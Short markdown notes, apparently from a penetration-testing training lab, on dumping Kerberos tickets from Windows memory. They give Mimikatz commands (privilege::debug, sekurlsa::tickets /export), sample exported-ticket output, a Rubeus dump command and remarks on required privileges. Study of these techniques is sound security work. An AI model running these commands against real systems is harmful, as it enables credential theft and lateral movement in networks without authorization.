# DUMPING TICKETS WITH MIMIKATZ
```
mimikatz.exe
```
```
privilege::debug
sekurlsa::tickets /export
```
>31cfa427a01e10f6e09492f2e8ddf7f74c79a5ef6b725569e19d614a35a69c07  
>Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]  
>* Saved to file [0;5063e]-1-0-40a50000-DC01$@LDAP-DC01.inlanefreight.htb.kirbi !  
```
exit
dir *.kirbi
```


# DUMPING TICKETS WITH RUBEUS
```
Rubeus.exe dump /nowrap
```


# INFO
- As a non-administrative user, you can only get your tickets, but as a local administrator, you can collect everything.
- The tickets that end with $ correspond to the computer account, which needs a ticket to interact with the Active Directory. User tickets have the user's name, followed by an @ that separates the service name and the domain, for example: [randomvalue]-username@service-domain.local.kirbi.
- At the time of writing, using Mimikatz version 2.2.0 20220919, if we run sekurlsa::ekeys it presents all hashes as des_cbc_md4 on some Windows 10 versions. Exported tickets (sekurlsa::tickets /export) do not work correctly due to the wrong encryption. It is possible to use these hashes to generate new tickets or use Rubeus to export tickets in Base64 format.







